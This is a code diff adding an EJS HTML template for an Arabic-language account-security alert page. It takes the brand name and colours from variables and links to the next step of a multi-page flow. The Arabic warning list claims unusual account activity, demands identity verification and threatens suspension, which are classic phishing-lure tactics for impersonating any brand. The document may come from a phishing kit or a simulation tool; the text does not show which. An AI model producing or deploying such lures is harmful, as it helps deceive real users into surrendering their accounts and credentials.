@@ -1,0 +1,49 @@
+<!doctype html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title><%= pageContent.page_title %> — <%= tpl.name %></title>
+<style>
+:root{--bg:<%= tpl.palette.bg %>;--card:<%= tpl.palette.card %>;--fg:<%= tpl.palette.fg %>;--ac:<%= tpl.palette.accent %>;--ac2:<%= tpl.palette.accent2 %>}
+*{box-sizing:border-box;margin:0;padding:0}
+body{background:var(--bg);color:var(--fg);font-family:system-ui,-apple-system,Tahoma,sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
+.card{background:var(--card);border-radius:16px;padding:36px 32px;max-width:440px;width:100%;text-align:center;box-shadow:0 8px 32px #00000040}
+.icon{width:64px;height:64px;background:#ef444420;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 20px;font-size:32px}
+h1{font-size:1.35rem;margin-bottom:10px;color:var(--fg)}
+p{font-size:.93rem;opacity:.7;line-height:1.6;margin-bottom:24px}
+.warn-box{background:#ef444415;border:1px solid #ef444440;border-radius:10px;padding:14px 16px;margin-bottom:24px;font-size:.88rem;color:#fca5a5;text-align:right}
+.warn-box ul{list-style:none;padding:0}
+.warn-box li{padding:4px 0;padding-right:16px;position:relative}
+.warn-box li::before{content:'•';position:absolute;right:0;color:#ef4444}
+.btn{display:block;width:100%;padding:14px;background:var(--ac);color:#fff;border:0;border-radius:10px;font-size:1rem;font-weight:600;cursor:pointer;text-decoration:none;transition:.2s}
+.btn:hover{opacity:.9}
+.brand-logo{font-size:1.1rem;font-weight:700;color:var(--ac);margin-bottom:24px;display:block}
+</style>
+</head>
+<body>
+<div class="card">
+  <span class="brand-logo"><%= tpl.name %></span>
+  <div class="icon">⚠️</div>
+  <h1><%= pageContent.headline %></h1>
+  <p><%= pageContent.subheadline %></p>
+
+  <div class="warn-box">
+    <ul>
+      <li>تم اكتشاف نشاط غير معتاد على حسابك</li>
+      <li>يجب التحقق من هويتك لحماية حسابك</li>
+      <li>قد يتم تعليق الحساب إذا لم تستجب</li>
+    </ul>
+  </div>
+
+  <% if (pageContent.cta) { %>
+    <% const nextPage = allPages[allPages.findIndex(p => p.slug === pageContent.slug) + 1]; %>
+    <% if (nextPage) { %>
+      <a href="/p/<%= page.slug %>/<%= nextPage.slug %>" class="btn"><%= pageContent.cta %></a>
+    <% } else { %>
+      <a href="/p/<%= page.slug %>/complete" class="btn"><%= pageContent.cta %></a>
+    <% } %>
+  <% } %>
+</div>
+</body>
+</html>
